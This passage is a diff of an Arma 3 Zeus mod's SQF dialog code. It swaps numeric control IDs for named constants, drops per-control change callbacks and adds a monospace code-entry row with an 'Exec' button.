@@ -11,12 +11,8 @@ MAZ_EZM_enableCleaner = profileNamespace getVariable ["MAZ_EZM_autoCleanerVar",t
 MAZ_EZM_stanceForAI = "UP";
 uiNamespace setVariable ["MAZ_EZM_activeWarnings",[]];
 uiNamespace setVariable ["MAZ_EZM_missingRespawnWarn",nil];
-if(isNil "MAZ_EZM_factionAddons") then {
-	MAZ_EZM_factionAddons = [];
-};
-if(isNil "MAZ_EZM_moduleAddons") then {
-	MAZ_EZM_moduleAddons = [];
-};
+MAZ_EZM_factionAddons = [];
+MAZ_EZM_moduleAddons = [];
 
 comment "Color Override";
 	EZM_themeColor = [0, 0.75, 0.75, 1];
@@ -61,25 +57,25 @@ comment "Dialog Creation";
 		showchat true;
 		private _display = findDisplay -1;
 
-		private _label = _display ctrlCreate ["RscText",201];
+		private _label = _display ctrlCreate ["RscText",IDC_TITLE];
 		_label ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetPositionW (["W",27] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetBackgroundColor EZM_dialogColor;
 		_label ctrlCommit 0;
 
-		private _background = _display ctrlCreate ["RscText",202];
+		private _background = _display ctrlCreate ["RscText",IDC_BACKGROUND];
 		_background ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_background ctrlSetPositionW (["W",27] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_background ctrlSetBackgroundColor EZM_dialogBackgroundCO;
 		_background ctrlCommit 0;
 
-		private _contentGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",203];
+		private _contentGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",IDC_CONTENT];
 		_contentGroup ctrlSetPositionX (["X",7] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_contentGroup ctrlSetPositionW (["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_contentGroup ctrlCommit 0;
 
-		private _okayButton = _display ctrlCreate ["RscButtonMenuOk",204];
+		private _okayButton = _display ctrlCreate ["RscButtonMenuOk",IDC_CONFIRM];
 		_okayButton ctrlSetPositionX (["X",28.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_okayButton ctrlSetPositionW (["W",5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_okayButton ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
@@ -98,7 +94,7 @@ comment "Dialog Creation";
 		}];
 		_okayButton ctrlCommit 0;
 
-		private _cancelButton = _display ctrlCreate ["RscButtonMenuCancel",205];
+		private _cancelButton = _display ctrlCreate ["RscButtonMenuCancel",IDC_CANCEL];
 		_cancelButton ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_cancelButton ctrlSetPositionW (["W",5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_cancelButton ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
@@ -140,12 +136,12 @@ comment "Dialog Creation";
 
 	MAZ_EZM_fnc_createRowBase = {
 		params ["_display"];
-		private _contentGroup = _display displayCtrl 203;
-		private _controlsGroupRow = _display ctrlCreate ["RscControlsGroupNoScrollbars",210,_contentGroup];
+		private _contentGroup = _display displayCtrl IDC_CONTENT;
+		private _controlsGroupRow = _display ctrlCreate ["RscControlsGroupNoScrollbars",IDC_ROW_GROUP,_contentGroup];
 		_controlsGroupRow ctrlSetPosition [0,0,(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_controlsGroupRow ctrlCommit 0;
 
-		private _rowLabel = _display ctrlCreate ["RscText",211,_controlsGroupRow];
+		private _rowLabel = _display ctrlCreate ["RscText",IDC_ROW_LABEL,_controlsGroupRow];
 		_rowLabel ctrlSetPosition [0,0,(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_rowLabel ctrlSetBackgroundColor [0,0,0,0.5];
 		_rowLabel ctrlCommit 0;
@@ -154,264 +150,228 @@ comment "Dialog Creation";
 	};
 
 	MAZ_EZM_fnc_createComboRow = {
-		params ["_display","_data","_onChange"];
-		_data params [
-			["_comboData",[],[[]]],
-			["_comboNames",[],[[]]],
-			["_defaultIndex",0,[0]]
-		];
+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_entries"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
-		private _combo = _display ctrlCreate ["RscCombo",213,_rowControlGroup];
+		private _combo = _display ctrlCreate ["RscCombo",IDC_ROW_COMBO,_rowControlGroup];
 		_combo ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_combo ctrlCommit 0;
 
-		_combo setVariable ["MAZ_EZM_onChange",_onChange];
-
-		_combo ctrlAddEventHandler ["lbSelChanged", {
-			params ["_control", "_lbCurSel", "_lbSelection"];
-			[ctrlParent _control,_lbSelection] call (_control getVariable "MAZ_EZM_onChange");
-		}];
-
-		for "_i" from 0 to (count _comboNames - 1) do {
-			private _data = if(count _comboData <= _i) then {str _i} else {_comboData # _i};
-			private _text = _comboNames # _i;
-			
-			_text params ["_text",["_tooltip",""],["_icon",""],["_textColor",[1,1,1,1]]];
+		{
+			_x params ["_value","_text","_tooltip","_picture","_textColor"];
 
 			private _index = _combo lbAdd _text;
 			_combo lbSetTooltip [_index,_tooltip];
-			_combo lbSetPicture [_index,_icon];
+			_combo lbSetPicture [_index,_picture];
 			_combo lbSetColor [_index,_textColor];
-			_combo lbSetData [_index,_data];
-			
-			if(_i == _defaultIndex) then {
-				_combo lbSetCurSel _i;
+			_combo setVariable [str _index,_value];
+
+			if(_value isEqualTo _defaultValue) then {
+				_combo lbSetCurSel _index;
 			};
-		};
+		} forEach _entries;
 
 		_rowControlGroup setVariable ["controlValue",{
 			params ["_controlsGroup"];
 
-			private _ctrlCombo = _controlsGroup controlsGroupCtrl 213;
-			private _index = lbCurSel _ctrlCombo;
-			_ctrlCombo lbData _index;
+			private _ctrlCombo = _controlsGroup controlsGroupCtrl IDC_ROW_COMBO;
+			_ctrlCombo getVariable str lbCurSel _ctrlCombo
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createEditRow = {
-		params ["_display","_data","_onChange"];
-		_data params ["_defaultText",["_height",1]];
+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_height"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
-		_rowControlGroup ctrlSetPositionH (["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
-		_rowControlGroup ctrlCommit 0;
 
-		private _edit = _display ctrlCreate ["RscEdit",214,_rowControlGroup];
-		_edit ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),pixelH,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
+		private _edit = _display ctrlCreate ["RscEdit",IDC_ROW_EDIT,_rowControlGroup];
+		_edit ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),pixelH,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
 		_edit ctrlSetTextColor [1,1,1,1];
 		_edit ctrlSetBackgroundColor [0,0,0,0.2];
 		_edit ctrlCommit 0;
-		
-		_edit setVariable ["MAZ_EZM_onChange",_onChange];
 
-		_edit ctrlAddEventHandler ["KeyUp", {
-			params ["_control", "_key", "_shift", "_ctrl", "_alt"];
-			[ctrlParent _control,ctrlText _control] call (_control getVariable "MAZ_EZM_onChange");
-		}];
-
-		_edit ctrlSetText _defaultText;
+		_edit ctrlSetText _defaultValue;
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup"];
-			ctrlText (_controlsGroup controlsGroupCtrl 214)
+			ctrlText (_controlsGroup controlsGroupCtrl IDC_ROW_EDIT)
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createEditMultiRow = {
-		params ["_display","_data","_onChange"];
-		_data params ["_defaultText",["_height",4]];
+		params ["_display","_defaultValue","_settings"];
+		_settings params [["_height",4]];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 		_rowControlGroup ctrlSetPositionH (["H",_height + 1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_rowControlGroup ctrlCommit 0;
 
-		private _label = _rowControlGroup controlsGroupCtrl 211;
+		private _label = _rowControlGroup controlsGroupCtrl IDC_ROW_LABEL;
 		_label ctrlSetPositionW (["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlCommit 0;
 
-		private _edit = _display ctrlCreate ["RscEditMulti",214,_rowControlGroup];
-		_edit ctrlSetPosition [pixelW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelW,(["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
+		private _edit = _display ctrlCreate ["RscEditMulti",IDC_ROW_EDIT,_rowControlGroup];
+		_edit ctrlSetPosition [pixelW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelW,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH];
+		_edit ctrlSetPositionH (["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_edit ctrlSetTextColor [1,1,1,1];
 		_edit ctrlSetBackgroundColor [0,0,0,0.2];
-		_edit ctrlSetText _defaultText;
+		_edit ctrlSetText _defaultValue;
 		_edit ctrlCommit 0;
-
-		_edit setVariable ["MAZ_EZM_onChange",_onChange];
-		
-		_edit ctrlAddEventHandler ["KeyUp", {
-			params ["_control", "_key", "_shift", "_ctrl", "_alt"];
-			[ctrlParent _control,ctrlText _control] call (_control getVariable "MAZ_EZM_onChange");
-		}];
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup"];
-			ctrlText (_controlsGroup controlsGroupCtrl 214)
+			ctrlText (_controlsGroup controlsGroupCtrl IDC_ROW_EDIT)
 		}];
 
 		_rowControlGroup
 	};
 
+	MAZ_EZM_fnc_createEditCodeRow = {
+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_height"];
+		private _rowControlGroup = [_display,_defaultValue,[_height]] call MAZ_EZM_fnc_createEditMultiRow;
+
+		private _execButton = _display displayCtrl IDC_CONFIRM;
+		_execButton ctrlSetText "Exec";
+		_execButton ctrlCommit 0;
+
+		private _edit = _display displayCtrl IDC_ROW_EDIT;
+		_edit ctrlSetTextColor [1,1,1,1];
+		_edit ctrlSetBackgroundColor [0,0,0,0.5];
+		_edit ctrlSetFont "EtelkaMonospacePro";
+		_edit ctrlSetFontHeight 0.03;
+		_edit ctrlSetText _defaultValue;
+		_edit ctrlCommit 0;
+
+		_rowControlGroup
+	};
+
 	MAZ_EZM_fnc_createListRow = {
-		params ["_display","_data","_onChange"];
-		_data params [
-			["_listData",[],[[]]],
-			["_listNames",[],[[]]],
-			["_defaultIndex",0,[0]],
-			["_height",6,[6]]
-		];
+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_entries","_height"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 		_rowControlGroup ctrlSetPositionH (["H",_height + 1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_rowControlGroup ctrlCommit 0;
 
-		private _label = _rowControlGroup controlsGroupCtrl 211;
+		private _label = _rowControlGroup controlsGroupCtrl IDC_ROW_LABEL;
 		_label ctrlSetPositionW (["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlCommit 0;
 
-		private _listBox = _display ctrlCreate ["RscListBox",213,_rowControlGroup];
+		private _listBox = _display ctrlCreate ["RscListBox",IDC_ROW_COMBO,_rowControlGroup];
 		_listBox ctrlSetPosition [0,(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",26] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_listBox ctrlSetPositionH (["H",_height] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_listBox ctrlCommit 0;
 
-		_listBox setVariable ["MAZ_EZM_onChange",_onChange];
-
-		_listBox ctrlAddEventHandler ["lbSelChanged", {
-			params ["_control", "_lbCurSel", "_lbSelection"];
-			[ctrlParent _control,_lbSelection] call (_control getVariable "MAZ_EZM_onChange");
-		}];
-
-		for "_i" from 0 to (count _listNames - 1) do {
-			private _data = if(count _listData <= _i) then {str _i} else {_listData # _i};
-			private _text = _listNames # _i;
-			
-			_text params ["_text",["_tooltip",""],["_icon",""],["_textColor",[1,1,1,1]]];
+		{
+			_x params ["_value","_text","_tooltip","_picture","_textColor"];
 
 			private _index = _listBox lbAdd _text;
 			_listBox lbSetTooltip [_index,_tooltip];
-			_listBox lbSetPicture [_index,_icon];
+			_listBox lbSetPicture [_index,_picture];
 			_listBox lbSetColor [_index,_textColor];
-			_listBox lbSetData [_index,_data];
-			
-			if(_i == _defaultIndex) then {
-				_listBox lbSetCurSel _i;
-			};
-		};
+			_listBox setVariable [str _index,_value];
 
-		"TODO : See if this is needed.";
-		'_listBox lbAdd " ";
+			if(_value isEqualTo _defaultValue) then {
+				_listBox lbSetCurSel _index;
+			};
+		} forEach _entries;
+		_listBox lbAdd " ";
 		_listBox lbAdd "  ";
-		_listBox lbAdd "   "';
+		_listBox lbAdd "   ";
 
 		_rowControlGroup setVariable ["controlValue",{
 			params ["_controlsGroup"];
 
-			private _ctrlList = _controlsGroup controlsGroupCtrl 213;
-			private _index = lbCurSel _ctrlList;
-			_ctrlList lbData _index;
+			private _ctrlCombo = _controlsGroup controlsGroupCtrl IDC_ROW_COMBO;
+			_ctrlCombo getVariable str lbCurSel _ctrlCombo
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createSidesRow = {
-		params ["_display","_data","_onChange"];
+		params ["_display","_defaultValue","_settings"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
 		_rowControlGroup ctrlSetPositionH (["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
-		
-		"Elements";
 
-			private _label = _rowControlGroup controlsGroupCtrl 211;
-			_label ctrlSetPositionH (["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
-			_label ctrlCommit 0;
+		private _label = _rowControlGroup controlsGroupCtrl IDC_ROW_LABEL;
+		_label ctrlSetPositionH (["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+		_label ctrlCommit 0;
 
-			private _background = _display ctrlCreate ["RscText",-1,_rowControlGroup];
-			_background ctrlSetBackgroundColor [0,0,0,0.6];
-			_background ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-			_background ctrlSetTextColor [1,1,1,0.5];
-			_background ctrlCommit 0;
+		private _background = _display ctrlCreate ["RscText",-1,_rowControlGroup];
+		_background ctrlSetBackgroundColor [0,0,0,0.6];
+		_background ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_background ctrlSetTextColor [1,1,1,0.5];
+		_background ctrlCommit 0;
 
-			private _sidesGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",217,_rowControlGroup];
-			_sidesGroup ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-			_sidesGroup ctrlCommit 0;
+		private _sidesGroup = _display ctrlCreate ["RscControlsGroupNoScrollbars",IDC_ROW_SIDES,_rowControlGroup];
+		_sidesGroup ctrlSetPosition [(["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_sidesGroup ctrlCommit 0;
 
-			private _blufor = _display ctrlCreate ["RscActivePicture",250,_sidesGroup];
-			_blufor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_west_ca.paa";
-			_blufor ctrlSetPosition [(["W",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-			_blufor ctrlCommit 0;
+		private _blufor = _display ctrlCreate ["RscActivePicture",IDC_SIDES_BLUFOR,_sidesGroup];
+		_blufor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_west_ca.paa";
+		_blufor ctrlSetPosition [(["W",2.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_blufor ctrlCommit 0;
 
-			private _opfor = _display ctrlCreate ["RscActivePicture",251,_sidesGroup];
-			_opfor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_east_ca.paa";
-			_opfor ctrlSetPosition [(["W",5.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-			_opfor ctrlCommit 0;
+		private _opfor = _display ctrlCreate ["RscActivePicture",IDC_SIDES_OPFOR,_sidesGroup];
+		_opfor ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_east_ca.paa";
+		_opfor ctrlSetPosition [(["W",5.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_opfor ctrlCommit 0;
 
-			private _indep = _display ctrlCreate ["RscActivePicture",252,_sidesGroup];
-			_indep ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_guer_ca.paa";
-			_indep ctrlSetPosition [(["W",8.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-			_indep ctrlCommit 0;
+		private _indep = _display ctrlCreate ["RscActivePicture",IDC_SIDES_INDEPENDENT,_sidesGroup];
+		_indep ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_guer_ca.paa";
+		_indep ctrlSetPosition [(["W",8.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_indep ctrlCommit 0;
 
-			private _civ = _display ctrlCreate ["RscActivePicture",253,_sidesGroup];
-			_civ ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_civ_ca.paa";
-			_civ ctrlSetPosition [(["W",11.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
-			_civ ctrlCommit 0;
+		private _civ = _display ctrlCreate ["RscActivePicture",IDC_SIDES_CIVILIAN,_sidesGroup];
+		_civ ctrlSetText "\a3\Ui_F_Curator\Data\Displays\RscDisplayCurator\side_civ_ca.paa";
+		_civ ctrlSetPosition [(["W",11.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",0.25] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["W",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
+		_civ ctrlCommit 0;
 
-		"Functionality";
+		if (_defaultValue isEqualType []) then {
+			_defaultValue = +_defaultValue;
+		};
 
-		private _allowMultiple = if(typeName _data == "ARRAY") then {
-			_data = +_data;
-			true;
-		} else {false};
-
-		_sidesGroup setVariable ["controlValue",_data];
-		_sidesGroup setVariable ["MAZ_EZM_onChange",_onChange];
+		private _allowMultiple = _defaultValue isEqualType [];
+		_sidesGroup setVariable ["controlValue",_defaultValue];
 
 		private _controls = [];
-		private _IDCs = [251,250,252,253];
+		private _IDCs = [IDC_SIDES_OPFOR,IDC_SIDES_BLUFOR,IDC_SIDES_INDEPENDENT,IDC_SIDES_CIVILIAN];
 		{
 			private _sideCtrl = _sidesGroup controlsGroupCtrl _x;
 			private _color = [_forEachIndex] call BIS_fnc_sideColor;
 			private _side = [_forEachIndex] call BIS_fnc_sideType;
-			_sideCtrl setVariable ["MAZ_EZM_SIDE",_side];
 
-			"Setup initial values";
-				_sideCtrl ctrlSetActiveColor _color;
-				if(_allowMultiple) then {
-					if(_side in _data) then {
-						[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
-					} else {
-						_color set [3,0.5];
-					};
+			_sideCtrl ctrlSetActiveColor _color;
+			if(_allowMultiple) then {
+				if(_side in _defaultValue) then {
+					[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
 				} else {
-					if(_side isEqualTo _data) then {
-						[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
-					} else {
-						_color set [3,0.5];
-					};
+					_color set [3,0.5];
 				};
-				_sideCtrl ctrlSetTextColor _color;
+			} else {
+				if(_side isEqualTo _defaultValue) then {
+					[_sideCtrl,1.2,0] call BIS_fnc_ctrlSetScale;
+				} else {
+					_color set [3,0.5];
+				};
+			};
+			_sideCtrl ctrlSetTextColor _color;
 
-			"If multiple selections";
 			if(_allowMultiple) then {
 				_sideCtrl ctrlAddEventHandler ["ButtonClick",{
 					params ["_sideCtrl"];
-					private _side = _sideCtrl getVariable "MAZ_EZM_SIDE";
+					(_sideCtrl getVariable "params") params ["_color","_side"];
 					private _controlGroup = ctrlParentControlsGroup _sideCtrl;
 					private _value = _controlGroup getVariable "controlValue";
 
-					private _scale = 1;
-					private _alpha = 0.5;
+					private _scale = "";
+					private _alpha = "";
 					if(_side in _value) then {
 						_value deleteAt (_value find _side);
 						_scale = 1;
@@ -421,22 +381,19 @@ comment "Dialog Creation";
 						_scale = 1.25;
 						_alpha = 1;
 					};
-					private _color = ctrlTextColor _sideCtrl;
 					_color set [3,_alpha];
 					_sideCtrl ctrlSetTextColor _color;
 					[_sideCtrl,_scale,0.1] call BIS_fnc_ctrlSetScale;
-
-					[ctrlParent _controlGroup,_value] call (_controlGroup getVariable "MAZ_EZM_onChange");
 				}];
 			} else {
 				_sideCtrl ctrlAddEventHandler ["ButtonClick",{
 					params ["_sideCtrl"];
+					(_sideCtrl getVariable "params2") params ["_controls"];
 					private _controlGroup = ctrlParentControlsGroup _sideCtrl;
 					{
-						private _ctrl = _x;
-						private _side = _ctrl getVariable "MAZ_EZM_SIDE";
-						private _scale = 1;
-						private _alpha = 0.5;
+						_x params ["_ctrl","_color","_side"];
+						private _scale = "";
+						private _alpha = "";
 						if(_ctrl isEqualTo _sideCtrl) then {
 							_scale = 1.25;
 							_alpha = 1;
@@ -445,21 +402,22 @@ comment "Dialog Creation";
 							_scale = 1;
 							_alpha = 0.5;
 						};
-						private _color = ctrlTextColor _ctrl;
 						_color set [3,_alpha];
 						_ctrl ctrlSetTextColor _color;
 						[_ctrl,_scale,0.1] call BIS_fnc_ctrlSetScale;
-					}forEach (allControls _controlGroup);
-
-					[ctrlParent _controlGroup,_controlGroup getVariable "controlValue"] call (_controlGroup getVariable "MAZ_EZM_onChange");
+					}forEach _controls;
 				}];
+
+				_controls pushBack [_sideCtrl, _color, _side];
 			};
-		}forEach [251,250,252,253];
+			_sideCtrl setVariable ["params",[_color,_side]];
+			_sideCtrl setVariable ["params2",[_controls]];
+		}forEach [IDC_SIDES_OPFOR,IDC_SIDES_BLUFOR,IDC_SIDES_INDEPENDENT,IDC_SIDES_CIVILIAN];
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup"];
 
-			private _ctrlSides = _controlsGroup controlsGroupCtrl 217;
+			private _ctrlSides = _controlsGroup controlsGroupCtrl IDC_ROW_SIDES;
 			_ctrlSides getVariable "controlValue"
 		}];
 
@@ -467,28 +425,18 @@ comment "Dialog Creation";
 	};
 
 	MAZ_EZM_fnc_createSliderRow = {
-		params ["_display","_data","_onChange"];
-		_data params [
-			["_min",0,[0]],
-			["_max",100,[100]],
-			["_defaultValue",50,[50]],
-			["_drawRadius",false,[false]],
-			["_radiusCenter",objNull,[objNull,[]]],
-			["_radiusColor",[1,1,1,1],[[]]],
-			["_isPercent",false,[false]]
-		];
-
+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_min","_max","_isPercent","_drawRadius","_radiusCenter","_radiusColor"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 		_rowControlGroup setVariable ["MAZ_EZM_isPercent",_isPercent];
 
-		private _slider = _display ctrlCreate ["RscXSliderH",215,_rowControlGroup];
+		private _slider = _display ctrlCreate ["RscXSliderH",IDC_ROW_SLIDER,_rowControlGroup];
 		_slider ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",13.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_slider ctrlSetTextColor [1,1,1,0.6];
 		_slider ctrlSetActiveColor [1,1,1,1];
 		_slider ctrlCommit 0;
-		_slider setVariable ["MAZ_EZM_onChange",_onChange];
 
-		private _sliderEdit = _display ctrlCreate ["RscEdit",214,_rowControlGroup];
+		private _sliderEdit = _display ctrlCreate ["RscEdit",IDC_ROW_EDIT,_rowControlGroup];
 		_sliderEdit ctrlSetPosition [(["W",23.7] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),pixelH,(["W",2.3] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),((["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH)];
 		_sliderEdit ctrlSetTextColor [1,1,1,1];
 		_sliderEdit ctrlSetBackgroundColor [0,0,0,0.2];
@@ -530,7 +478,7 @@ comment "Dialog Creation";
 			params ["_ctrlSlider", "_value"];
 			private _controlGroup = ctrlParentControlsGroup _ctrlSlider;
 			private _isPercent = _controlGroup getVariable ["MAZ_EZM_isPercent",false];
-			private _ctrlEdit = _controlGroup controlsGroupCtrl 214;
+			private _ctrlEdit = _controlGroup controlsGroupCtrl IDC_ROW_EDIT;
 			if(_isPercent) then {
 				private _text = (str (round (_value * 100))) + "%";
 				_ctrlEdit ctrlSetText _text;
@@ -538,8 +486,6 @@ comment "Dialog Creation";
 				private _roundedValue = round _value;
 				_ctrlEdit ctrlSetText format ["%1",_roundedValue];
 			};
-			
-			[ctrlParent _ctrlSlider,round _value] call (_ctrlSlider getVariable "MAZ_EZM_onChange");
 		}];
 
 		_sliderEdit ctrlAddEventHandler ["keyUp",{
@@ -547,9 +493,9 @@ comment "Dialog Creation";
 			private _num = parseNumber (ctrlText _displayOrControl);
 			private _ctrlGroup = ctrlParentControlsGroup _displayOrControl;
 			private _isPercent = _ctrlGroup getVariable ["MAZ_EZM_isPercent",false];
-			private _sliderCtrl = _ctrlGroup controlsGroupCtrl 215;
+			private _sliderCtrl = _ctrlGroup controlsGroupCtrl IDC_ROW_SLIDER;
 			if(_isPercent) then {
-				_sliderCtrl sliderSetPosition (round (_num/100));
+				_sliderCtrl sliderSetPosition (_num/100);
 			} else {
 				_sliderCtrl sliderSetPosition _num;
 			};
@@ -557,18 +503,18 @@ comment "Dialog Creation";
 
 		_rowControlGroup setVariable ["controlValue",{
 			params ["_controlsGroup"];
-			sliderPosition (_controlsGroup controlsGroupCtrl 215)
+			sliderPosition (_controlsGroup controlsGroupCtrl IDC_ROW_SLIDER)
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createToolBoxRow = {
-		params ["_display","_data"];
-		_data params ["_default","_strings"];
